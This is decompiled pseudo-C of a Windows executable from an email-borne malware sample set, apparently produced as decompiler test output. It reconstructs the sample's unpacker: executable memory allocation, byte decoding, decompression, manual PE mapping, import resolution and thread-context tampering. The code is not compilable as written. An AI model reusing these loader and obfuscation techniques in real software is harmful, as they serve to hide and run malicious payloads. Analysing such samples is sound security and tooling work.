// subject.c
// Generated on TIMESTAMP by decompiling malware_via_email/malware_0156/ia32_pe/subject.exe
// using Decompiler version VERSION

#include "subject.h"

void fn00401030(word32 dwArg04, word32 dwArg08, word32 dwArg0C)
{
	word32 eax_10 = dwArg08;
	word32 edx_12 = dwArg04;
	word32 ecx_14 = dwArg0C;
	if (dwArg0C != 0x00000000)
		do
		{
			Mem34[edx_12 + 0x00000000:byte] = Mem0[eax_10 + 0x00000000:byte];
			eax_10 = eax_10 + 0x00000001;
			edx_12 = edx_12 + 0x00000001;
			ecx_14 = ecx_14 - 0x00000001;
		} while (ecx_14 != 0x00000000);
	return;
}

void fn0040105A()
{
fn0040105A_entry:
l0040105A:
	word32 ebx_17 = Mem0[0x00402100:word32]
	word32 edx_22 = ebx_17 + Mem0[ebx_17 + 0x0000003C:word32]
	Mem28[0x00402128:word32] = Mem0[edx_22 + 0x00000034:word32]
	word32 dwLoc08_30 = (word32) Mem28[edx_22 + 0x00000006:byte]
	word32 eax_40 = VirtualAlloc(Mem28[edx_22 + 0x00000034:word32], Mem28[edx_22 + 0x00000050:word32], 0x00003000, 0x00000040)
l00401097:
	Mem44[fp - 0x00000028:word32] = Mem28[edx_22 + 0x00000054:word32]
	Mem46[fp - 0x0000002C:word32] = Mem44[0x00402100:word32]
	fn00401030(eax_40, 0x00003000, 0x00000040)
	word32 edi_50 = edx_22 + 0x000000F8
l004010AE:
	fn00401030(eax_40 + Mem46[edi_50 + 0x0000000C:word32], Mem46[0x00402100:word32] + Mem46[edi_50 + 0x00000014:word32], Mem46[edi_50 + 0x00000010:word32])
	word32 v13_69 = dwLoc08_30 - 0x00000001
	edi_50 = edi_50 + 0x00000028
	dwLoc08_30 = v13_69
	branch v13_69 != 0x00000000 l004010AE
l004010D0:
fn0040105A_exit:
}

void fn004010D8(word32 dwArg04, word32 dwArg08)
{
	word32 ecx_10 = dwArg04;
	word32 edx_11 = dwArg08;
	do
	{
		Mem14[ecx_10 + 0x00000000:byte] = Mem0[ecx_10 + 0x00000000:byte] + 0x04;
		Mem17[ecx_10 + 0x00000000:byte] = Mem14[ecx_10 + 0x00000000:byte] - 0x01;
		Mem19[ecx_10 + 0x00000000:byte] = Mem17[ecx_10 + 0x00000000:byte] + 0x2F;
		Mem22[ecx_10 + 0x00000000:byte] = Mem19[ecx_10 + 0x00000000:byte] + 0x01;
		ecx_10 = ecx_10 + 0x00000001;
		edx_11 = edx_11 - 0x00000001;
	} while (edx_11 != 0x00000000);
	Mem28[0x00402008:word32] = Mem22[0x00402008:word32] + 0x00000004;
	return;
}

void fn004010FD(word32 ebp)
{
	word32 ecx_17 = Mem0[0x00405074:word32];
	Mem18[0x00402000:word32] = ecx_17;
	Mem23[0x00402004:word32] = 0x00000000;
	word32 v11_24 = Mem23[0x00402004:word32] + (ecx_17 << 0x00000003);
	Mem25[0x00402004:word32] = v11_24;
	word32 esi_15 = 0x00405088;
	Mem25[0x00401014:word32]();
	Mem25[0x00401014:word32]();
	word32 ecx_65 = Mem25[0x00402000:word32] + Mem25[0x0040200C:word32];
	do
	{
		Mem69[0x0040200C:word32] = Mem25[0x0040200C:word32] + 0x00000001;
		ecx_65 = ecx_65 - 0x00000001;
	} while (ecx_65 != 0x00000000);
	Mem73[0x00402008:word32] = ecx_65 | 0x00405000;
	Mem77[fp - 0x00000030:word32] = Mem73[0x00402000:word32];
	word32 esp_80 = fp - 0x00000030;
	word32 ecx_81 = 0x00000002;
	do
	{
		esp_80 = esp_80 - 0x00000004;
		Mem87[esp_80 + 0x00000000:word32] = esi_15;
		esi_15 = Mem87[0x00402008:word32];
		ecx_81 = ecx_81 - 0x00000001;
	} while (ecx_81 != 0x00000000);
	fn00401030(dwArg00, dwArg04, dwArg08);
	Mem95[esp_80 + 0x00000008:word32] = Mem87[0x00402000:word32];
	Mem97[esp_80 + 0x00000004:word32] = Mem95[0x00402008:word32];
	fn004010D8(dwArg00, dwArg04);
	return;
}

word32 fn004011EC(word32 eax, word32 ecx, word32 edx, word32 ebx, ptr32 edxOut, ptr32 ebxOut, ptr32 esiOut)
{
	word32 edx_4 = edx_eax % ecx;
	*edxOut = edx_4;
	word32 ebx_10;
	*ebxOut = ebx + (SEQ(edx_4, eax) /u ecx << 0x00000002);
	word32 esi_12;
	*esiOut = Mem0[0x00402108:word32];
	return 0x00000000;
}

void fn004011FC()
{
	word32 esi_30 = Mem0[0x00402128:word32];
	word32 ebx_37 = Mem0[Mem0[esi_30 + 0x0000003C:word32] + esi_30 + 0x00000080:word32] + esi_30;
	do
	{
		word32 eax_49 = LoadLibraryA(Mem0[ebx_37 + 0x0000000C:word32] + Mem0[0x00402128:word32]);
		word32 esi_53 = Mem0[ebx_37 + 0x00000000:word32] + Mem0[0x00402128:word32];
		word32 edi_55 = Mem0[ebx_37 + 0x00000010:word32] + Mem0[0x00402128:word32];
		do
		{
			Mem68[edi_55 + 0x00000000:word32] = GetProcAddress(eax_49, Mem0[esi_53 + 0x00000000:word32] + Mem0[0x00402128:word32] + 0x00000002);
			edi_55 = edi_55 + 0x00000001 + 0x00000003;
			esi_53 = esi_53 + 0x00000004;
		} while (Mem68[esi_53 + 0x00000000:word32] != 0x00000000);
		word32 ebx_74 = ebx_37 - 0x00000002;
		ebx_37 = ebx_74 + 0x00000016;
	} while (Mem68[ebx_74 + 0x00000022:word32] != 0x00000000);
	return;
}

void fn00401276(selector fs)
{
fn00401276_entry:
l00401276:
	branch 0x00000000 == 0x00000000 l0040127C
l0040127B:
l0040127C:
	Mem14[Mem0[Mem0[fs:0x00000018:word32] + 0x00000030:word32] + 0x00000008:word32] = Mem0[0x00402128:word32]
	return
fn00401276_exit:
}

void fn00401291(selector fs)
{
	fn004011FC();
	fn00401276(fs);
	return;
}

void fn004012A6(word32 dwArg04, word32 dwArg08)
{
	word32 eax_8 = LoadLibraryA(0x0040129C);
	if (dwArg04 == 0x00000000)
		Mem23[fp - 0x00000008:word32] = 0x004012D6;
	else
		Mem25[fp - 0x00000008:word32] = 0x004012E9;
	Mem18[dwArg08 + 0x00000000:word32] = GetProcAddress(eax_8, 0x0040129C);
	return;
}

void fn004012FC(word32 dwArg04, word32 dwArg08)
{
	Mem24[dwArg04 + 0x00000000:word32] = HeapAlloc(HeapCreate(0x00000001, 0x00000000, 0x00000000), 0x00000008, dwArg08);
	return;
}

void fn00401320()
{
	word32 ebx_19 = Mem0[0x00402104:word32] + 0x00000001;
	byte dl_11 = 0x00;
	word32 edx_16 = 0x00000100;
	do
	{
		Mem20[ebx_19 + 0x00000000:byte] = 0x01;
		Mem21[ebx_19 + 0x00000000:byte] = dl_11;
		dl_11 = dl_11 + 0x01;
		ebx_19 = ebx_19 + 0x000000A0;
		edx_16 = DPB(edx_16, dl_11, 0, 8);
	} while (dl_11 != 0x00);
	Mem28[0x00402110:word32] = edx_16;
	return;
}

word32 fn00401344()
{
	byte dl_16 = 0x00;
	word32 esi_29;
	word32 edx_27;
	word32 ebx_28;
	word32 eax_30 = fn004011EC(Mem0[0x0040210C:word32], 0x00000020, 0x00000000, Mem0[0x00402008:word32], out edx_27, out ebx_28, out esi_29);
	esi_39 = esi_29;
	do
	{
		word32 esi_39;
		esi_39 = esi_39 - 0x00000001;
		word32 edi_44 = __bswap(Mem0[ebx_28 + 0x00000000:word32]) << dl_16;
		if (edi_44 >>u 0x0000001F != 0x00000000)
			eax_30 = eax_30 + ((edi_44 >>u 0x0000001F) << (byte) esi_39);
		edx_27 = edx_27 + 0x00000001;
		dl_16 = (byte) edx_27;
		if (edx_27 == 0x00000020)
		{
			ebx_28 = ebx_28 + 0x00000004;
			edx_27 = 0x00000000;
			dl_16 = 0x00;
		}
	} while (esi_39 != 0x00000000);
	Mem67[0x0040210C:word32] = Mem0[0x0040210C:word32] + esi_29;
	return eax_30;
}

void fn004013A0(word32 dwArg04)
{
	word32 ebx_37 = Mem0[0x00402104:word32] + (word32) (dwArg04 *u 0x000000A0);
	word32 edi_28 = 0x00402010;
	word32 ecx_40 = (word32) Mem0[ebx_37 + 0x00000000:byte] + 0x00000001;
	word32 esi_42 = ebx_37;
	while (ecx_40 != 0x00000000)
	{
		Mem47[edi_28 + 0x00000000:byte] = Mem0[esi_42 + 0x00000000:byte];
		esi_42 = esi_42 + 0x00000001;
		edi_28 = edi_28 + 0x00000001;
		ecx_40 = ecx_40 - 0x00000001;
	}
	return;
}

void fn004013CA()
{
	Mem8[0x00402010:byte] = Mem0[0x00402010:byte] + 0x01;
	Mem16[(word32) Mem8[0x00402010:byte] + 0x00402010:byte] = Mem8[0x0040211C:byte];
	return;
}

void fn004013E4()
{
	word32 ecx_32 = (word32) Mem0[0x00402010:byte];
	word32 edi_30 = Mem0[0x00402100:word32] + Mem0[0x00402114:word32];
	Mem34[0x00402114:word32] = Mem0[0x00402114:word32] + ecx_32;
	word32 esi_36 = 0x00402011;
	while (ecx_32 != 0x00000000)
	{
		Mem42[edi_30 + 0x00000000:byte] = Mem34[esi_36 + 0x00000000:byte];
		esi_36 = esi_36 + 0x00000001;
		edi_30 = edi_30 + 0x00000001;
		ecx_32 = ecx_32 - 0x00000001;
	}
	Mem46[0x00402118:word32] = edi_30;
	return;
}

void fn0040140E()
{
	Mem7[0x0040211C:byte] = Mem0[0x00402011:byte];
	return;
}

void fn0040141F()
{
	if (Mem0[0x00402110:word32] == 0x00000200)
	{
		Mem6[0x00402110:word32] = 0x00000100;
		Mem7[0x00402108:word32] = 0x00000009;
	}
	return;
}

void fn00401442()
{
	word32 ecx_20 = (word32) Mem0[0x00402010:byte];
	word32 ebx_17 = Mem0[0x00402104:word32] + (word32) (Mem0[0x00402110:word32] *u 0x000000A0);
	Mem23[ebx_17 + 0x00000000:byte] = (byte) ecx_20;
	word32 esi_22 = 0x00402011;
	word32 edi_26 = ebx_17 + 0x00000001;
	while (ecx_20 != 0x00000000)
	{
		Mem32[edi_26 + 0x00000000:byte] = Mem23[esi_22 + 0x00000000:byte];
		esi_22 = esi_22 + 0x00000001;
		edi_26 = edi_26 + 0x00000001;
		ecx_20 = ecx_20 - 0x00000001;
	}
	Mem38[0x00402110:word32] = Mem23[0x00402110:word32] + 0x00000001;
	fn0040141F();
	return;
}

void fn00401486()
{
	fn004012FC(0x00402100, 0x0000EA60);
	fn004012FC(0x00402104, 0x00C35000);
	fn00401320();
	Mem24[0x00402108:word32] = 0x00000009;
	word32 eax_25 = fn00401344();
	fn004013A0(eax_25);
	fn004013E4();
	fn0040140E();
	word32 dwLoc0C_26 = eax_25;
	while (Mem24[0x00402004:word32] - Mem24[0x0040210C:word32] >= Mem24[0x00402108:word32])
	{
		word32 eax_44 = fn00401344();
		if (eax_44 > Mem24[0x00402110:word32] - 0x00000001)
		{
			fn004013A0(dwLoc0C_26);
			fn004013CA();
		}
		else
			fn004013A0(eax_44);
		fn004013E4();
		fn0040140E();
		fn004013A0(dwLoc0C_26);
		fn004013CA();
		fn00401442();
		dwLoc0C_26 = eax_44;
	}
	return;
}

void fn0040153D(selector fs)
{
	fn0040105A();
	fn00401291(fs);
	return;
}

void fn00401549(word32 ebp)
{
	Mem4[ebp - 0x00000008:word32] = GetCurrentThread();
	Mem26[ebp - 0x00000004:word32] = CreateThread(0x00000000, 0x00000000, Mem4[ebp + 0x0000000C:word32] + 0x00000001, 0x00000000, 0x00000004, 0x00000000);
	return;
}

void fn00401575(word32 ebp)
{
	ResumeThread(Mem0[ebp - 0x00000004:word32]);
	SuspendThread(Mem0[ebp - 0x00000008:word32]);
	return;
}

void fn00401588(word32 ebp)
{
	Mem4[ebp + 0xFFFFFD2C:word32] = 0x00010002;
	GetThreadContext(Mem4[ebp - 0x00000004:word32], ebp + 0xFFFFFD2C);
	Mem15[ebp + 0xFFFFFDDC:word32] = Mem4[ebp + 0x0000000C:word32];
	fn004012A6(0x00000001, 0x00402124);
	word32 v11_30 = Mem15[0x00402124:word32] + 0x00000005;
	Mem31[0x00402124:word32] = v11_30;
	Mem31[0x00402124:word32]();
	return;
}

void fn004015D6()
{
	fn00401549(fp - 0x00000004);
	fn00401588(fp - 0x00000004);
	fn00401575(fp - 0x00000004);
	return;
}

void fn004015F5(selector fs)
{
	fn004015D6();
	fn004010FD(fp - 0x00000004);
	fn00401486();
	fn0040153D(fs);
	return;
}

